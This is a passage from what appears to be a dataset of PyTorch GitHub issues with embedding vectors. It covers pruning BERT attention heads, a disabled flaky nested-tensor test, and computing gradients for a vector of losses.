cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-3.97148311e-01 -7.34505951e-02 -2.77697831e-01 -4.99940813e-02
 -2.28845820e-01 -3.23292375e-01  3.65248978e-01  1.60609961e-01
 -3.68816584e-01 -3.22847553e-02 -7.36521631e-02  5.60771488e-02
  8.34198222e-02  2.42392346e-03  1.47745550e-01  1.91123724e-01
 -2.94496924e-01 -5.80382012e-02 -1.20303139e-01 -1.77911788e-01
  1.16797999e-01 -1.27567291e-01 -1.73970893e-01  8.74245390e-02
 -4.31708470e-02  1.64202869e-01  4.26195860e-02 -9.03616995e-02
  3.42041075e-01  8.74941647e-02 -3.79784852e-02  3.00416872e-02
 -4.35198545e-01  1.14387274e-01 -1.86541215e-01  2.46406689e-01
 -3.31831843e-01 -1.33074701e-01 -3.14459324e-01  3.38635296e-02
  4.64914627e-02  9.08262730e-02  1.72634229e-01 -2.04177469e-01
  7.29150698e-03  6.04180321e-02 -1.52344882e-01  9.87623036e-02
 -3.34989846e-01 -1.34334162e-01  1.45108357e-01  1.84384286e-01
  1.14184126e-01 -4.18063998e-01 -2.40388066e-02 -4.12102602e-02
 -5.01979627e-02  2.59276796e-02  7.30349869e-02 -4.44843292e-01
  2.99504519e-01 -1.83687240e-01 -3.79320905e-02 -1.40997544e-02
 -7.77448416e-02 -2.20843405e-02  2.00837642e-01  6.76745735e-03
  3.14031541e-01  2.70354927e-01  2.35670269e-01  8.11327696e-02
 -2.32166559e-01 -1.38749406e-01  2.27954030e-01  1.07256517e-01
 -2.12613806e-01  5.85082509e-02 -1.47987336e-01 -2.67568260e-01
  6.57624453e-02 -8.25953931e-02 -1.59809925e-02  2.51740459e-02
  1.10855669e-01 -4.11071442e-03  1.97449759e-01 -1.30533844e-01
  4.52709198e-01  2.34217897e-01  3.04504395e-01  6.66377097e-02
 -1.77923009e-01  2.94006705e-01 -6.36036843e-02  2.48394281e-01
  3.06027770e-01 -1.64230183e-01 -4.44320917e-01 -2.77022421e-02
 -2.41945297e-01 -6.81776479e-02 -2.29475945e-01  1.68718964e-01
  1.43492103e-01 -2.20957816e-01  1.25777811e-01  1.06376097e-01
 -2.10340805e-02 -2.07195535e-01  2.40518555e-01 -2.03896672e-01
  7.28780031e-02  6.24194667e-02  1.54326588e-01 -8.87168348e-02
  3.02950162e-02  1.00216400e-02 -1.91386402e-01 -1.49261862e-01
 -1.54610276e-01  1.91800490e-01  1.08801693e-01  3.90797347e-01
  2.36338139e-01  1.00947022e-01 -4.91339862e-02 -1.48657382e-01
 -5.36563396e-02  1.87356830e-01  8.98088813e-02 -6.83688298e-02
 -8.57524425e-02 -1.51874647e-01  6.52938485e-02  2.19799846e-01
 -8.14071596e-02  6.86123967e-05 -1.60348535e-01  5.66607080e-02
  1.27571106e-01 -1.31643176e-01  5.99887185e-02 -2.75068343e-01
  2.52517819e-01 -1.34990215e-01 -2.24495262e-01  1.03601348e-02
  1.55003630e-02 -1.44745111e-01 -8.28176960e-02  8.67522582e-02
 -3.90806019e-01  1.06994741e-01  1.42919555e-01  1.87515691e-02
 -1.08236924e-01  6.08001761e-02  2.90296853e-01 -2.76781797e-01
  1.21542022e-01  2.66522348e-01  7.23336264e-03 -7.02791288e-02
  2.22671419e-01  1.78269699e-01 -9.70545560e-02 -1.36608303e-01
 -2.29580194e-01  1.40575636e-02 -5.46846054e-02 -8.81973878e-02
 -2.00095057e-01 -5.46417423e-02  2.95455456e-01 -9.71062705e-02
 -3.80611241e-01 -3.45125973e-01  4.45521623e-02  4.88995254e-01
  4.18666065e-01  4.18983579e-01  5.04056096e-01  1.20562904e-01
  5.36758676e-02  2.75851011e-01  2.87886560e-01  9.93340835e-02
 -1.44088287e-02 -1.99993290e-02 -2.05785483e-01 -1.97264001e-01
 -2.51654029e-01  4.14678045e-02 -3.31728756e-02 -3.16849798e-01
  1.46253794e-01 -1.46686822e-01 -1.12135552e-01  3.44782099e-02
 -2.08723694e-01  3.97824533e-02 -2.47254912e-02 -2.30290383e-01
  1.49300456e-01 -2.67383717e-02 -1.83169901e-01 -2.97653317e-01
 -8.11142549e-02  2.23284900e-01 -1.26382690e-02 -2.01150820e-01
  9.84212011e-03 -2.61975616e-01  7.70796612e-02 -1.26829594e-01
 -2.70419959e-02  9.35861468e-02 -3.01046789e-01  8.85044187e-02
  2.68448234e-01  1.04667827e-01  9.05676708e-02 -1.92974761e-01
 -1.07812300e-01  1.33547574e-01 -1.48701772e-01 -1.20923281e-01
 -6.18358999e-02 -5.51609807e-02  1.20948493e-01 -5.26607454e-01
  3.47862363e-01 -7.38615692e-02  1.07744783e-01 -4.41771746e-02
 -2.33155727e-01  1.20185539e-01  1.33407950e-01 -2.28618726e-01
 -4.88115907e-01 -6.05455600e-02  1.43866688e-01 -2.28315189e-01
  5.34947179e-02  1.47536904e-01 -3.01640391e-01 -1.35189205e-01
 -2.39791438e-01  7.06581771e-02 -5.99165671e-02 -4.87462245e-03
 -4.86729741e-02 -9.03294533e-02  1.31169289e-01  1.15062118e-01
  1.80651933e-01 -7.00628012e-02 -1.99416682e-01 -5.33389710e-02
  1.02818474e-01  2.29934156e-01 -1.63867548e-01  2.26382941e-01
  1.45756394e-01  1.47600636e-01 -1.20799839e-02  2.63688475e-01
 -6.29823506e-02 -4.13188245e-03  1.46212876e-01 -2.94012696e-01
  1.98516712e-01 -8.54677558e-02  1.74366102e-01 -2.89089262e-01
  3.13459694e-01  2.57616192e-02 -1.20900951e-01 -2.97919482e-01
  5.35706207e-02  1.97243333e-01 -1.63174033e-01 -6.67341426e-02
  2.94185549e-01 -4.31405425e-01  1.80803780e-02  3.80354375e-03
  1.30221099e-02 -2.07616344e-01 -9.38100815e-02 -2.12316662e-02
  3.24346602e-01 -1.62290096e-01 -2.13752329e-01  9.25346017e-02
  2.28263289e-01 -5.97286075e-02  2.83910148e-02  6.27984107e-03
  1.01305306e-01  6.25379533e-02  1.18103877e-01 -8.33119750e-02
 -2.27840483e-01 -2.78938059e-02  1.79720059e-01 -1.42932236e-02
  2.45511070e-01 -1.85536772e-01  3.03909719e-01  1.00503258e-01
 -1.68225747e-02  3.30276728e-01  3.44882607e-02  1.84715807e-01
 -1.32773057e-01  3.47751856e-01  3.11443686e-01  2.37011209e-01
 -2.17855424e-01 -3.43728542e-01 -2.60722309e-01 -1.57426968e-02
  1.48271263e-01  2.48998925e-01 -1.41154245e-01 -2.66574293e-01
 -2.11710393e-01 -1.25584587e-01  6.24064729e-02  7.92416744e-03
  1.10278912e-02  5.75233251e-02  1.68477371e-01 -1.02909207e-01
 -2.10475534e-01  3.91300321e-01 -8.10756534e-02  8.89891982e-02
 -1.62105814e-01  9.74214301e-02  2.93093007e-02 -1.79230317e-01
 -2.17184603e-01 -1.55851811e-01  1.89985797e-01  1.30362034e-01
  2.65492238e-02  1.76000834e-01 -1.64927959e-01  3.60240974e-02
  1.49185017e-01  1.22762755e-01  8.48564357e-02  2.80427516e-01
  5.67481779e-02  3.66563443e-03  4.98059615e-02  3.31019878e-01
 -2.32149988e-01  1.82302266e-01 -3.08901608e-01  8.27785283e-02
 -2.18564235e-02  1.33329853e-01  8.52843150e-02  6.61414489e-02
  1.81108773e-01  3.69366586e-01 -4.11416471e-01  1.68848515e-01
  6.20868802e-03  1.02518894e-01  2.61626959e-01 -1.21327862e-01
 -3.85079533e-04  3.44379544e-02 -5.12913503e-02 -3.09465900e-02
 -4.78569493e-02  2.20220178e-01  6.74023181e-02  1.06350645e-01]"
Pruning/Compressing heads in attention blocks ,"### ðŸš€ The feature, motivation and pitch

I've a conceptual question

BERT-base has a dimension of 768 for query, key and value and 12 heads (Hidden dimension=768, number of heads=12). The same is conveyed if we see the BERT-base architecture

```
(self): BertSelfAttention(
              (query): Linear(in_features=768, out_features=768, bias=True)
              (key): Linear(in_features=768, out_features=768, bias=True)
              (value): Linear(in_features=768, out_features=768, bias=True)
              (dropout): Dropout(p=0.1, inplace=False)
)
```
Now, my question is:

Can I consider the first 64 neurons from the _out_features_ as the first-head, the next 64 neurons from the _out_features_ as the 2nd head and so on? (sec 3.2.2 from original paper; [Link](https://papers.nips.cc/paper/2017/file/3f5ee243547dee91fbd053c1c4a845aa-Paper.pdf))

Basically, I am wondering if the Linear module representing query matrix; which is 768x768 can be thought as (768x64), (768x64)...12 times? The same for key and value modules

If so, is it possible to provide some starter code as I am unable to wrap around my head. Any help is appreciated (and I've some sample in the contribution section)

**P.S:** Here's the issue from StackOverflow ([link](https://datascience.stackexchange.com/questions/124233/understanding-multi-headed-attention-from-architecture-details))

### Alternatives

Example applications include papers from academia such as - [Paper1](https://lena-voita.github.io/posts/acl19_heads.html), [Paper2](https://github.com/pmichel31415/are-16-heads-really-better-than-1)

I referred to some of the previous posts ([link](https://datascience.stackexchange.com/questions/88330/how-do-the-linear-layers-in-the-attention-mechanism-work)), but I would appreciate any validation on this thought-process as it's similar but not same.

### Additional context

Here's a code which prunes a particular % in particular layer depending on _layer_index_ and _prune_percentage_
```
model = AutoModelForMaskedLM.from_pretrained(checkpoint)
linear_layers_list = []
for name, layer in model.named_modules():
    if name in model_layers_list:
        linear_layers_list.append(layer)
print(f""No of linear layers are: {len(linear_layers_list)}"")

layer = linear_layers_list[layer_index]
if prune_type == 'ln_structured':
    # Ln structured with n=1 i.e L1 pruning
    prune.ln_structured(layer, name='weight', amount=prune_percentage, dim=0, n=n)
```
I can understand that I can basically pass the Linear module and prune x% of weights.

Now, I would like to prune/remove one head in a similar fashion.

P.S: Raised a request in Huggingface as well, happy to close both ([Issue link](https://github.com/huggingface/transformers/issues/27044))
Thanks
```[tasklist]
### Tasks
```
",False,"[-1.12230912e-01  1.27898201e-01 -2.72998869e-01 -3.14547181e-01
  1.36492327e-02  4.12839316e-02  2.90438950e-01  1.07138634e-01
  1.31502748e-06 -5.46554066e-02  9.59270373e-02 -5.75895831e-02
  3.86663467e-01 -1.04215764e-01  2.08052754e-01  6.86985850e-02
  7.89794475e-02 -4.48501669e-03 -1.90792680e-01  8.19856524e-02
  2.92297378e-02 -6.72187470e-03 -4.54497784e-02 -6.36305660e-02
  1.58996657e-02 -1.10203564e-01 -5.20501882e-02  2.34549493e-01
  3.69572818e-01  6.54834807e-02  1.29217938e-01  8.68582949e-02
  1.44498467e-01 -3.34515981e-02 -1.09741632e-02  7.11700544e-02
 -2.58297294e-01 -9.49782729e-02  1.20946810e-01  1.80959433e-01
 -8.64944458e-02  2.17724323e-01  9.11546499e-02 -1.67903826e-01
  6.24749511e-02 -9.27607939e-02 -3.53785902e-01  1.85792789e-01
 -8.99407342e-02 -2.21960515e-01  7.64308795e-02  2.94244349e-01
 -4.40256208e-01 -2.11639345e-01 -2.55914241e-01  1.87468290e-01
 -1.40842527e-01 -1.40717685e-01 -8.95475820e-02  1.98272318e-02
  3.86305302e-02 -3.91049981e-02  6.24543428e-02  1.66193888e-01
  1.04513243e-01  8.38615745e-02 -3.07141468e-02 -6.85012639e-02
  1.62697434e-01  3.58357191e-01  3.19160163e-01 -1.15661196e-01
 -3.59855860e-01 -1.12800620e-01  4.33499575e-01 -1.14789978e-02
 -4.38387305e-01 -2.13707499e-02  3.76849733e-02 -3.68197322e-01
  1.96305290e-01 -2.23246410e-01 -8.03108960e-02  2.75515079e-01
  1.11314505e-01  1.40661020e-02  4.43981469e-01  2.37323772e-02
  1.94639832e-01  1.03700995e-01  1.75798237e-01 -8.29743147e-02
 -3.79670143e-01  7.08793402e-02  4.32148308e-01 -3.43073644e-02
  2.29117393e-01 -4.63914722e-02 -2.49987364e-01  2.13469267e-01
 -7.06135556e-02  4.91127037e-02 -1.11225463e-01 -4.38200057e-01
  1.29650474e-01  2.94046938e-01 -3.14243510e-03  7.22942501e-02
  1.00820705e-01  8.59117508e-02 -6.91291392e-02 -2.32049927e-01
  1.34809494e-01 -1.77690610e-01 -9.73288156e-03 -3.64693105e-01
 -4.33364287e-02 -1.88036159e-01 -3.55427600e-02 -1.56185210e-01
  1.45402148e-01  1.05079100e-01 -3.04220840e-02  3.83121371e-01
  1.71811149e-01  3.79705764e-02 -1.36903495e-01  8.64547640e-02
  3.92598473e-02 -1.38353810e-01  1.16415322e-01 -7.76133686e-02
  9.02132690e-03  1.42865896e-01  1.05595313e-01 -1.07917383e-01
  2.30285794e-01  2.10162610e-01 -5.06064445e-02 -4.67064828e-02
 -3.02870691e-01 -3.84066813e-02  5.66533357e-02 -1.92213997e-01
  4.44054604e-02  2.47860581e-01 -4.04117703e-01 -2.05632411e-02
  9.59838927e-02 -6.39176592e-02 -1.70925915e-01  1.16252162e-01
 -3.10467660e-01  1.71686321e-01  9.76840109e-02  4.15614471e-02
 -1.72707766e-01  9.21690315e-02 -5.15049100e-02 -3.25183310e-02
 -8.65957886e-02  2.24477053e-02  1.53991073e-01  5.38285524e-02
  4.35590148e-01  9.79239792e-02  3.53084970e-03 -6.39579147e-02
 -5.94870187e-02  2.35368878e-01  3.91418003e-02 -8.05671513e-02
 -3.29506844e-01  2.32659385e-01  4.07234073e-01 -7.97524229e-02
 -3.84346664e-01 -1.99103922e-01  2.97161425e-03  2.30682790e-01
  4.35916856e-02  7.95883313e-02  2.01386720e-01  3.22100185e-02
 -8.55635107e-02  2.18088299e-01  1.79618359e-01  1.92952543e-01
 -2.25894570e-01  2.58977693e-02 -1.53751194e-01 -2.22307518e-01
  6.79065138e-02  9.02452916e-02 -1.53960079e-01 -2.64591843e-01
  3.45486671e-01 -1.08938500e-01  1.07015535e-01  1.32763758e-01
 -2.94969320e-01 -8.13470259e-02 -2.44399056e-01 -3.58637333e-01
 -3.49902846e-02  1.94205672e-01 -5.94211183e-02 -9.40188393e-03
  1.93306834e-01  2.22259566e-01 -3.22295964e-01 -2.80253410e-01
  1.29907548e-01 -3.17365944e-01  2.65147477e-01 -1.94413796e-01
 -1.42934471e-01 -9.91221294e-02 -5.98925501e-02  1.61156893e-01
  3.19135785e-02  5.25813997e-02 -4.41101909e-01 -3.32722604e-01
 -3.99045765e-01  1.11739457e-01 -3.42489958e-01 -1.33256540e-02
 -1.93926930e-01  6.83682859e-02  1.49580866e-01 -1.72545761e-01
  4.31974411e-01 -4.69158627e-02  4.38034199e-02  1.57352239e-01
  7.48017654e-02  8.22293609e-02  1.86716430e-02 -1.77957743e-01
 -3.83759081e-01 -2.66624093e-01 -2.64013797e-01  3.33959162e-02
  3.17799300e-03 -2.77810507e-02 -4.14818853e-01  9.87164676e-02
 -7.58657698e-03  2.67190218e-01 -2.57619202e-01 -7.81162828e-02
  2.84463584e-01  5.61308935e-02 -1.24832019e-01  3.77145559e-02
 -2.25530565e-01  2.94807673e-01 -5.84736131e-02  1.61383152e-02
  1.80424675e-01  7.14244619e-02 -1.98022142e-01  1.63595825e-01
  3.29661012e-01  8.27447772e-02  1.75891966e-01  4.09048855e-01
  2.06319332e-01 -1.35883898e-01  9.11015086e-03 -1.72658414e-01
  5.26028126e-03  1.55706070e-02  4.75102514e-02 -1.00698601e-03
  3.62194180e-01 -1.26427412e-01 -3.41748118e-01 -1.17986187e-01
 -2.03564823e-01 -3.88805941e-02  2.59044111e-01  1.39736444e-01
  2.43169904e-01 -2.74104834e-01 -1.27574727e-01  3.52036536e-01
 -9.79634225e-02 -6.61922991e-02 -2.20190719e-01 -2.08562333e-02
 -1.60792440e-01  7.08032846e-02 -1.14054158e-01  1.77179113e-01
  2.89802909e-01 -1.25181451e-01 -2.46867687e-02  1.88465655e-01
  1.61120445e-01  2.15615422e-01  4.13703829e-01  3.74731347e-02
 -4.57764179e-01  1.10489026e-01  1.58816874e-01 -1.64234042e-02
  2.96960235e-01 -5.04611246e-02  2.05871426e-02  3.02445054e-01
 -2.10470259e-01  3.07367504e-01 -1.39590055e-01  3.44485939e-02
 -3.16055954e-01  4.26120698e-01  1.07387796e-01 -1.18276179e-02
 -2.68455982e-01  4.03583050e-04 -7.89540708e-02  2.12267518e-01
  2.04042971e-01  1.08033001e-01 -1.82056248e-01 -1.70145452e-01
 -1.92443222e-01  1.77580565e-01  2.01133147e-01  2.34623253e-02
 -2.99145430e-01  1.12455308e-01  8.82249624e-02 -1.91909939e-01
 -3.72382760e-01  2.79765308e-01 -1.57883808e-01 -1.46857709e-01
  1.28053278e-01 -1.07097432e-01  1.55831009e-01 -2.59099126e-01
 -3.13505888e-01 -3.57745253e-02 -1.39405698e-01  6.63053393e-01
 -1.94907859e-01  1.83080826e-02  9.44553688e-02  2.18135357e-01
 -2.46988952e-01  2.88805868e-02  3.62294018e-01  1.90915614e-01
 -1.44796386e-01 -1.05952874e-01 -1.21240012e-01 -6.58620223e-02
 -1.87932134e-01 -1.32252723e-01 -2.16913342e-01  1.63905412e-01
  1.11264363e-02  6.89835921e-02  4.73708212e-01 -3.44722159e-02
  1.36146933e-01 -1.13096133e-01 -1.92026034e-01  7.15095997e-02
 -1.93234950e-01  7.91851282e-02  1.32404655e-01  3.41434255e-02
  1.49751112e-01  5.04214615e-02 -2.32430175e-01 -1.44503251e-01
 -1.60422415e-01  2.16553569e-01 -2.70390481e-01  1.72738805e-01]"
DISABLED test_abs_backward_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_abs_backward_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17999233694).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_abs_backward_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-3.02594900e-01  3.93595099e-02 -1.48893267e-01  2.04245783e-02
 -1.96915139e-02 -4.29524660e-01 -5.53008281e-02  1.67577207e-01
 -3.66536140e-01 -2.24602729e-01  3.36431861e-01 -9.39553007e-02
  2.65162289e-01  3.23238559e-02 -1.03563547e-01 -9.23828483e-02
 -1.09121419e-01 -6.28457889e-02  4.61505771e-01  1.27258062e-01
 -2.91121870e-01 -2.00478602e-02 -2.09705949e-01  2.62169242e-01
  2.37810239e-01  2.04294138e-02 -1.43197000e-01 -9.69079584e-02
  4.13187630e-02 -6.99220225e-04  2.41196558e-01  5.10248281e-02
 -2.20033273e-01 -4.06158939e-02  4.88924026e-01  2.20239848e-01
 -4.59520482e-02 -2.23431200e-01 -3.14750373e-01 -1.73680171e-01
  2.44676992e-01 -2.06922144e-02 -5.34106344e-02 -1.27118528e-01
  2.37474605e-01  2.25176476e-02 -1.93337947e-01  2.35529140e-01
 -1.98028177e-01 -1.64732486e-01  1.33556664e-01 -1.33318588e-01
  8.59678388e-02 -4.78712738e-01  8.57843310e-02 -5.39146326e-02
  1.56372935e-01  3.83592695e-01  1.18251935e-01  2.42134869e-01
  1.18466005e-01  4.42725234e-02 -1.78345025e-01 -5.85968681e-02
  1.63992140e-02  6.24554045e-02  1.66597769e-01 -2.84702361e-01
  3.94466758e-01  1.41382255e-02  1.88295707e-01 -1.93260312e-01
 -3.19434345e-01 -7.84903914e-02  1.59780577e-01  1.80591136e-01
 -2.69506693e-01  4.72066402e-02 -7.25814253e-02 -4.18032967e-02
 -5.65863997e-02 -1.72286201e-03  2.16723457e-02  1.17115110e-01
  2.19631076e-01  1.24828614e-01  1.47221670e-01  2.11337805e-02
  1.67244077e-01 -2.59070545e-01  1.38537601e-01  2.91332379e-02
 -9.99195576e-02 -2.43991930e-02 -9.48340148e-02 -7.93352127e-02
  2.91318357e-01 -6.76447600e-02 -3.58498901e-01  1.81081697e-01
  1.34694964e-01 -2.79710531e-01 -3.78997549e-02  3.04893017e-01
 -2.74794400e-01 -3.51940066e-01  4.79910076e-01  1.25751376e-01
  4.00687382e-02 -2.01057762e-01  1.54062599e-01  6.14278018e-02
 -5.35337180e-02  3.94363552e-02  1.22027576e-01 -9.24770683e-02
 -1.29992425e-01 -1.65768296e-01 -8.71257577e-03  5.70804954e-01
 -2.39486128e-01 -8.33256319e-02  1.36222750e-01 -5.29845990e-02
  2.40109712e-01 -1.39587065e-02 -7.72130564e-02  4.46646959e-02
  1.75625056e-01  5.82309850e-02  5.83304316e-02  1.08669274e-01
 -2.10910395e-01 -1.75958186e-01  8.17190558e-02 -3.22908163e-03
 -2.77866423e-02 -2.56512612e-01  1.15891412e-01  1.07710645e-01
 -1.77612334e-01  2.25557029e-01  6.25382811e-02 -1.99795067e-01
  2.28935674e-01 -1.87291950e-02 -3.09589840e-02  1.09980389e-01
 -3.72260027e-02  2.93634497e-02  1.58655271e-03  3.54860127e-02
  3.10162008e-01  3.95821482e-01  8.74065682e-02 -8.14493932e-03
  3.13667476e-01  1.08560279e-01  7.03510642e-02 -8.96411911e-02
 -4.04396802e-02  4.74807411e-01 -1.32906362e-01  8.45558941e-02
  2.40282074e-01 -1.97592378e-01 -4.82229233e-01  8.38271156e-02
 -4.59034294e-02  2.19181016e-01 -7.27659464e-02 -1.11766241e-01
  1.98159292e-01 -1.14269681e-01  4.34118323e-04 -1.06395766e-01
  3.68214548e-01 -2.58372903e-01 -1.58387393e-01  1.84399053e-01
  8.11088234e-02 -9.29172486e-02  1.76994830e-01  9.61387902e-02
 -1.30480272e-03  2.50897348e-01  1.41576946e-01 -5.41804917e-02
 -4.71658912e-03 -1.26063004e-01 -6.21957064e-01 -1.78658441e-01
 -8.86149332e-02  2.90891714e-02 -2.50513554e-01 -2.63099313e-01
 -6.56972229e-02 -6.23163842e-02 -1.28722921e-01  5.76871075e-02
 -2.43971288e-01  3.60759705e-01  2.55522847e-01 -5.15339077e-02
 -4.90146503e-03  2.05661014e-01 -3.85150313e-01 -4.31772768e-01
  1.71336591e-01  4.47410196e-02 -1.49478704e-01 -3.30355205e-02
  7.31704757e-02 -2.11708143e-01 -7.08365962e-02  6.58419132e-02
  6.29626121e-03  3.58651243e-02  7.24093057e-03  1.94685668e-01
 -3.24843645e-01 -2.83894427e-02 -2.71887720e-01 -9.28885266e-02
 -3.02898645e-01 -1.22245446e-01 -1.30003661e-01  3.07347178e-01
 -3.37294415e-02  5.23837842e-03 -1.14327207e-01 -2.16245770e-01
  1.10858433e-01 -1.87609382e-02  3.21267873e-01 -2.27317095e-01
 -1.79113120e-01 -8.15569758e-02  2.30319556e-02  5.21551728e-01
 -4.27206695e-01 -5.82168996e-01 -1.11915387e-01  1.65887102e-01
  5.93080968e-02  1.84544429e-01  3.96380201e-02 -2.65633881e-01
 -1.62062734e-01  4.78476621e-02 -7.58451000e-02 -2.55056977e-01
  1.24515243e-01 -8.41694623e-02  7.63517171e-02  4.59674895e-01
 -9.63905230e-02  9.73074734e-02  2.35885382e-03  2.92702541e-02
 -1.05153024e-01  4.53892708e-01 -1.64363414e-01  2.70253241e-01
  2.40575492e-01  1.40476346e-01 -1.91034392e-01 -3.45369801e-02
  2.67638806e-02 -1.91249460e-01  3.71625900e-01 -6.37489140e-01
 -4.39276546e-02  1.38373792e-01  2.36645430e-01 -1.94740385e-01
  4.23197806e-01  1.21614374e-01 -3.03224511e-02 -1.93896353e-01
  2.21100867e-01  4.70598936e-02 -1.26202568e-01 -1.07348800e-01
  1.92490339e-01 -3.08123648e-01 -1.55788250e-02 -5.17438129e-02
 -2.97933102e-01 -9.00091529e-02 -1.02131277e-01  2.05215141e-01
  8.96224603e-02  3.44082154e-02 -3.58105332e-01  1.29919369e-02
  2.94441521e-01 -2.53880590e-01  8.91997293e-02 -2.07108602e-01
 -1.99568629e-01 -1.29654646e-01  1.10125154e-01 -3.10961336e-01
  1.61091238e-02 -5.52305914e-02  1.75549388e-02 -4.27145660e-02
  3.70269030e-01 -2.34710425e-01 -1.89960785e-02  2.62330174e-01
 -8.43349248e-02  1.66620553e-01  3.74037698e-02  3.00587602e-02
 -9.52159017e-02  3.07019383e-01 -2.36002989e-02  2.01020896e-01
  3.23140144e-01 -5.79188317e-02 -3.93541098e-01  2.03769863e-01
  1.52540818e-01  1.61791015e-02 -4.07888055e-01 -8.42998847e-02
 -1.06399074e-01  4.95805219e-03 -1.16958529e-01 -6.37291595e-02
 -7.92846382e-02 -1.92970142e-01  6.18155114e-02 -3.17355916e-02
 -9.79056209e-02  5.14674962e-01  2.96362936e-02 -2.34868959e-01
  1.31965190e-01 -4.14226204e-02  9.18925107e-02 -2.14147598e-01
 -1.60336614e-01  1.06288642e-02  1.73319712e-01  1.98429048e-01
  2.14794353e-01  1.53789371e-01 -1.82899088e-01  7.33696967e-02
 -2.83724666e-01 -2.38663554e-01 -9.67688411e-02  4.32054639e-01
  2.40693673e-01  6.30223006e-02  3.63833427e-01  5.22078753e-01
 -1.71047300e-01 -1.65307686e-01 -3.23523819e-01 -2.27007210e-01
  1.17103800e-01 -7.75721520e-02 -6.49693012e-02  1.60837788e-02
  6.25396594e-02  1.87427819e-01 -3.60687196e-01  1.41436726e-01
 -8.10568333e-02  2.07580775e-01  1.67024523e-01 -9.78566781e-02
  1.77338958e-01 -2.85589337e-01 -4.23594788e-02  6.47556875e-03
 -8.93672481e-02  6.64904490e-02  7.10467249e-02  2.35297367e-01]"
vector loss autograd computation triaged module: vmap,"### ðŸš€ The feature, motivation and pitch

Hi, the default torch autograd only supports scalar loss, but if we need to compute vectorized loss, e.g., losses = [loss1, loss2, ... lossn], wrt. to weights, how to achieve this function efficiently without loop? Our current workaround is looping through all loss, 

grad_vectors = []
for l in losses:
    grad = torch.autograd.grad(l, self.weight, retain_graph=True)[0]
    grad_vectors.append(grad)


### Alternatives

_No response_

### Additional context

_No response_

cc @zou3519",False,"[-0.5093979   0.31834328  0.05049349 -0.22307879  0.03019884 -0.03578978
  0.06514457  0.33574742 -0.6833421   0.09340118 -0.08765278  0.05803146
 -0.2126107   0.17306481 -0.34129775  0.01780362 -0.6387781   0.21305163
 -0.15011021 -0.25455415  0.10962954 -0.12156174 -0.13733986  0.18988101
  0.409189    0.3494905  -0.01248463 -0.18912596  0.41061074 -0.20379415
 -0.11960596 -0.2991776  -0.05440592  0.12527911  0.13043064 -0.03139259
 -0.26245195 -0.18045995 -0.27519202  0.01993881  0.15447319  0.07858739
 -0.05246744 -0.28405622  0.209793   -0.15860039 -0.32653582 -0.07979248
 -0.27755538 -0.07139108  0.2933932   0.14344968 -0.3200508  -0.02316858
  0.05488078  0.19773346  0.3836171  -0.31527168  0.1474098  -0.23602565
  0.258528    0.01371257 -0.16291244 -0.01165405  0.10517663 -0.2649832
  0.00280624  0.29485652  0.37076867  0.5831096  -0.10845017 -0.20521078
 -0.3968917   0.12750378  0.03905835  0.10999423 -0.08936009  0.00351301
  0.13071147 -0.10860844  0.01687602  0.13712424 -0.03555159 -0.11990803
  0.02020056 -0.1324292   0.19700511 -0.29118603  0.81168693  0.28070742
  0.01049399  0.0795395  -0.2846588   0.36169368  0.18136056  0.06051922
  0.28246537 -0.2368926   0.01460135  0.08170827 -0.24451974 -0.12367757
  0.00192115 -0.05824884 -0.17146215  0.08360408  0.00948605  0.33317465
  0.4038009  -0.02659914  0.21883908  0.04493843  0.1048675   0.05973965
 -0.13450931  0.0746445   0.022989   -0.09249626 -0.19328061  0.25806448
 -0.1305338  -0.06278837  0.12466643  0.33128625  0.30443776 -0.03219821
 -0.2333713   0.00736055  0.20286052 -0.2051073   0.28823343  0.18074778
 -0.26898837  0.07834346  0.02050453  0.11839069 -0.0881968  -0.12782204
 -0.28509462  0.04199073 -0.6025901  -0.02561654 -0.18518458 -0.11963611
  0.1448259   0.08759974 -0.18843722  0.02853568  0.17503339  0.10499068
  0.08905886 -0.31788313 -0.3269981   0.00351077  0.25860617  0.13103676
  0.09977749 -0.04758117  0.08550373 -0.37592918  0.10533915  0.10969419
  0.27415097 -0.2211259   0.5913025   0.2706197  -0.20092033  0.06649382
 -0.10786711  0.24362156  0.33431774 -0.2403653  -0.17274114  0.07410206
  0.66919976 -0.21529791 -0.10203347 -0.24683243 -0.1905562   0.315485
  0.07025281  0.02182639  0.35510236  0.12973651  0.1959979   0.22369084
  0.3225194  -0.19095623 -0.35849234  0.10729162  0.03328114 -0.07935731
  0.05118717  0.28319025 -0.09113855 -0.346156   -0.19608484 -0.26349604
 -0.23153251 -0.04411625 -0.22150648 -0.13583077  0.17177413 -0.19828144
  0.12397999 -0.04091845 -0.33981192 -0.36739522 -0.18159664  0.24755004
 -0.10438882 -0.43246293  0.15207401 -0.36010927 -0.25327295 -0.42734098
  0.08328566 -0.03241903 -0.15465677  0.14580911  0.2716981   0.41692823
 -0.07302491 -0.2080777  -0.26495197  0.23443782 -0.18629394 -0.11097313
 -0.17890984 -0.00454589 -0.04885577 -0.2263624   0.22916909  0.1552015
  0.18043905  0.27081734 -0.07604676  0.01575283 -0.34219137 -0.19259045
 -0.11347076 -0.25953552 -0.30378214 -0.01800137  0.123834    0.50025606
 -0.4551707   0.12912151  0.05931333  0.313812   -0.37062877  0.25514424
  0.07607157 -0.09738252  0.39480317 -0.16121139 -0.09758639  0.08637511
  0.07533211 -0.15380004  0.1708023   0.23051223 -0.12691726  0.3891545
  0.22358361 -0.02559531 -0.00816689 -0.1935552   0.08343886 -0.1241628
  0.24822502 -0.51233304  0.25355422  0.23206049  0.06146939 -0.20311646
  0.16536069  0.09088901  0.04376693 -0.33397263  0.14640982  0.41336066
